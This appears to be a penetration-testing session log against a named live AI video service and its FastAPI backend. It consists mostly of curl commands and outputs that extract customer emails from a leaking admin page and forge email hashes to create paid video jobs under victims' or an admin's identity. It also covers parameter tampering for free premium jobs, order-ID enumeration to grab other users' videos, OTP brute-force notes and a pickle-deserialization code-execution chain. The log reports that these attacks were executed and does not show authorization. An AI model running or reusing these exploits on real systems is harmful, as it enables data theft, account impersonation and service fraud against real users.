# Everlyn.ai Session 2026-08-13 — Plain-GET Leak + FastAPI Backend + hash(email) IDOR

Session-specific detail for `nextjs-authn-authz-probing` §14-§18. All commands
executed and verified against https://www.everlyn.ai and https://vapi.everlyn.ai.

## 1. Plain-GET admin leak (no CVE-2025-29927 header)

Previous sessions (2026-08-05) used `x-middleware-subrequest` to reach `/admin`.
This session proved the data also leaks via **plain unauthenticated GET** — the
RSC flight payload embeds the full table before the client-side redirect runs.

```bash
# size-delta test
curl -s -o /dev/null -w "%{size_download}\n" https://www.everlyn.ai/nonexistent-xyz   # 6,749 (404)
curl -s -o /dev/null -w "%{size_download}\n" https://www.everlyn.ai/admin              # 45,732 (leak)
curl -s -o /dev/null -w "%{size_download}\n" https://www.everlyn.ai/admin/orders       # 77,273 (leak)
curl -s -o /dev/null -w "%{size_download}\n" https://www.everlyn.ai/admin/users        # 46,191 (leak, no rows)

# extraction — 50 real orders
curl -s https://www.everlyn.ai/admin/orders | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u
# → victim-1@example.invalid, victim-2@example.invalid, victim-3@example.invalid,
#   victim-4@example.invalid, victim-5@example.invalid, victim-6@example.invalid, ... (25 unique)

# row structure inside flight payload (escaped JSON):
# children\":\"<order_id>\" ... children\":\"<email>\" ... children\":\"<plan>\" ... children\":<amount_cents> ... children\":\"<timestamp>\"
# e.g. order:853516859318341 | victim-5@example.invalid | Starter | 999 | 8/8/2026, 6:48:59 PM
```

`/api/admin/orders` ALSO returns the same 77KB HTML (Content-Type: text/html) —
it is a page route, not a JSON API. `/api/admin/users` returns true JSON 403
(`{"code":403,"message":"Unauthorized"}`) — genuine API, gated.

Hidden sub-route discovery: flight data contains `"c":["","admin"]` and route
group `(admin)` — brute-forced `/admin/{users,orders,videos,generations,tasks,...}`;
users + orders are real pages, videos/generations/tasks returned 000 (Cloudflare
timeout — exists but slow, worth retrying).

## 2. FastAPI backend — vapi.everlyn.ai

Discovered via JS chunk grep: `NEXT_PUBLIC_VAPI_BASE_URL || "https://vapi.everlyn.ai"`.

`GET https://vapi.everlyn.ai/openapi.json` → 200, 37 endpoints, full schemas.
Notable unauthenticated / weak-auth endpoints:

| Endpoint | Result |
|---|---|
| `GET /api/history/{user_id}` | 200 for ANY user_id (`{"success":true,"user_id":"1","total_records":0,...}`) — IDOR, empty because no records, but NO auth check |
| `GET /api/auth/check-user/{user_id}` | format oracle: `{"detail":"Invalid user ID format"}` for non-UUID, `{"exists":false,"email_exists":false,...}` for valid UUID shape — UUID enumeration oracle |
| `GET /check_ai/{order_id}` | 200 pre-auth: `{"video_path":null,"message":"Invalid order id: X"}` — order-status polling without auth |
| `GET /discord-bot/status` | `{"running":true,"user":"Everlyn#9431","guilds":4}` |
| `POST /order` | **CRITICAL — see §3** |
| `POST /stripe/webhook` | properly signed (`400: No signature found`) ✅ |
| `POST /stripe/fulfill-checkout` | leaks Stripe request ID: `Request req_RiNTAw7u4cJbJg: No such checkout.session` |

Schemas revealing weak auth design:
- `ChangePassword: [user_id, old_password, new_password]` — no session token field
- `DeleteAccount: [user_id]` — same
- `UpdateProfile: [user_id, fullname, username, mobileNumber, disconnectGoogle]` — same
- `StreamRequest: [user_id, user_hash, user_limit, videoPrompt, resolution, ...]` — hash computed client-side

Note: `user_id` for these = UUID (`Invalid user ID format` for email). UUIDs were
NOT in the orders leak (emails only), so ATO chain was not completed — honest
negative. If a UUID source is found, ChangePassword/DeleteAccount become IDOR-ATO.

## 3. hash(email) IDOR — pre-auth GPU theft (PROVEN)

Frontend JS computes `user_hash` as unsalted SHA-512 of the user's email:

```js
// module export Z in chunk — verbatim:
let s = async e => {
  let t = new TextEncoder().encode(e);
  return Array.from(new Uint8Array(await crypto.subtle.digest("SHA-512", t)))
    .map(e => e.toString(16).padStart(2,"0")).join("")
}
```

Exploit (executed 2026-08-13):
```bash
H=$(python3 -c "import hashlib;print(hashlib.sha512(b'victim-4@example.invalid').hexdigest())")
curl -X POST https://vapi.everlyn.ai/order -H 'Content-Type: application/json' -d "{
  \"user_id\":\"victim-4@example.invalid\", \"user_hash\":\"$H\", \"user_limit\":6,
  \"videoPrompt\":\"operator probe test\", \"resolution\":\"t2v_W_480f\",
  \"aspect_ratio\":\"16:9\", \"video_length\":\"5\", \"prompt_refinement\":\"original\",
  \"is_image\":false, \"is_audio\":false, \"need_watermark\":true,
  \"call_from\":\"web\", \"motion_scale\":\"balanced\"}"
# → {"order_id":"6a7cc9d9e96345e804e5c08e","message":"Ok"}

curl -s https://vapi.everlyn.ai/check_ai/6a7cc9d9e96345e804e5c08e
# → {"video_path":null,"message":"Queuing, please wait..."}  ← task really queued
```

Chain: §1 email leak → SHA-512(email) → POST /order → GPU burns under victim
identity. Unlimited free video generation + attribution fraud. CONFIDENCE: PROVEN.

## 4. OTP throttle asymmetry (www.everlyn.ai)

- `POST /api/send-verification-code` — throttled: 2nd request →
  `{"error":"Please wait 60 seconds before sending the verification code"}` ✅
- `POST /api/register` (the VERIFY step) — **NO lockout**: 8/8 wrong codes returned
  `{"error":"Invalid or expired verification code"}` with no captcha/throttle.
- Code = 6 digits, `expiresIn: 600` leaked in send response.
- Type juggling on verificationCode (`null`, `[]`, int, `""`) all rejected properly.
- Feasibility: ~1667 req/s needed — impractical behind Cloudflare. Severity: the
  missing lockout is a real hardening gap; becomes exploitable if the RNG is weak
  (could not confirm RNG server-side from black box).

## 5. Verbose error leaks

- `POST /api/auth/register` (vapi) with fresh email →
  `"Failed to send verification email: 500: ... Partial credentials found in
  explicit, missing: aws_secret_access_key"` — AWS SDK config leak (key ID present
  in env, secret missing). Also means email verification on vapi is BROKEN —
  registration via vapi cannot complete (www frontend uses its own working flow).
- Email enumeration on www: `send-verification-code` →
  `{"error":"Email already registered"}` vs `{"success":true,...,"expiresIn":600}`.
  Confirmed `admin@everlyn.ai` IS registered (valid spray target).
- `forgot-password` is properly ambiguous ✅.

## 6. Honest negatives (do not re-test these)

- Cookie/header forge on `/api/check-admin` (isAdmin=true cookie, X-Forwarded-For
  127.0.0.1, X-Middleware-Subrequest: 1) → all `{"isAdmin":false}`
- Method confusion POST/PUT on auth endpoints → 405
- `/api/proxy-image?url=` — validated, rejects 127.0.0.1 / 169.254.169.254 / file://
- `/api/gen-video/create-task` with fake user_id+hash → session-checked ✅ (the
  www frontend gates it; the vapi `/order` equivalent is the broken one)
- register-with-existing-email overwrite → code checked before duplicate ✅
- rpc.testnet.everlyn.ai / api.testnet.everlyn.ai — no response (down or filtered)
- R2 bucket pub-15984869bb484e86883f255760f4d058.r2.dev — no listing ✅
- NextAuth credentials flow — standard 302, no oracle

## 7b. Parameter abuse + user_id format pivot (same-day extension, PROVEN)

After the hash(email) IDOR succeeded, further fuzzing of `/order` params showed
the abuse surface is wider than identity spoofing — all executed, all accepted:

```bash
H=$(python3 -c "import hashlib;print(hashlib.sha512(b'victim-4@example.invalid').hexdigest())")

# MongoDB ObjectId as user_id (24-hex) — accepted
curl -s -X POST https://vapi.everlyn.ai/order -H 'Content-Type: application/json' \
  -d "{\"user_id\":\"6a7cc9d9e96345e804e5c08e\",\"user_hash\":\"$H\",...}"
# → {"order_id":"6a7ccb4c956ca0bd0faa38ae","message":"Ok"}

# arbitrary ObjectId 000000000000000000000000 — accepted
# → {"order_id":"6a7ccb4f956ca0bd0faa38b0","message":"Ok"}

# credits_to_lock:0 + user_limit:999999 + need_watermark:false + is_audio:true
# + t2v_B_1080p + 10s — top-tier job, zero cost, pre-auth
# → {"order_id":"6a7ccb4ffe50bd3e9fc00454","message":"Ok"}

# admin identity spoof — order created as admin@everlyn.ai
# → {"order_id":"6a7ccb08956ca0bd0faa38ac","message":"Ok"}
```

Format oracle detail: `check-user/{id}` returns `Invalid user ID format` for
UUID-shaped ids but `{"exists":false,"email_exists":false,"password_exists":false}`
for 24-hex ObjectIds → backend = MongoDB, user_id loosely typed.

Order-ID enumeration: issued order_ids are sequential timestamp-prefix Mongo
ObjectIds — sweep range around a known id via `/check_ai/{id}` (pre-auth) to
catch other users' `video_path` when jobs finish.

## 8. Cosmos testnet recon (LYN token)

Frontend JS embeds full chain config (module 61541):
`chainId everlyn-testnet-1`, `rpc.testnet.everlyn.ai`, `api.testnet.everlyn.ai`,
bech32 prefix `everlyn`, denom `ulyn` 6dec, features stargate+ibc-transfer.
Utility narrative in UI strings: "earn points on every video", "your videos on
chain", "use $LYN autonomous agents"; KAITO 50% bonus badge.

Both RPC and REST were **unreachable (HTTP 000)** at test time — chain offline.
No on-chain surface testable; value flow currently off-chain points DB
(`get-user-points`, `add-share-points` — both session-gated properly).
everlyn.app (mobile wallet flow domain) also dead.

Chain-offline handling: report as infra finding; the real $-token vector is the
§3/§7b backend IDOR if off-chain points later convert at TGE/airdrop.

## 7. Web3 ML repos recap (from this session, full detail in everlyn-ai-supply-chain-case-study.md)

- Everlyn-1 repo = 3 submodule pointers: Openlyn/{Wasserstein-VQ, ANTRP, EfficientARV}
- codeload tarball fetch works when git https helper is broken:
  `curl -sL https://codeload.github.com/Openlyn/<repo>/tar.gz/refs/heads/main`
- 24+ `torch.load()` call sites without `weights_only=True` across all 3 repos
- ANTRP chain: config ckpt URL → `is_url()` → `download_cached_file(check_hash=False)`
  (dist_utils.py:120) → `torch.load()` (base_model.py:40) → pickle RCE. PoC executed,
  marker created. PROVEN.
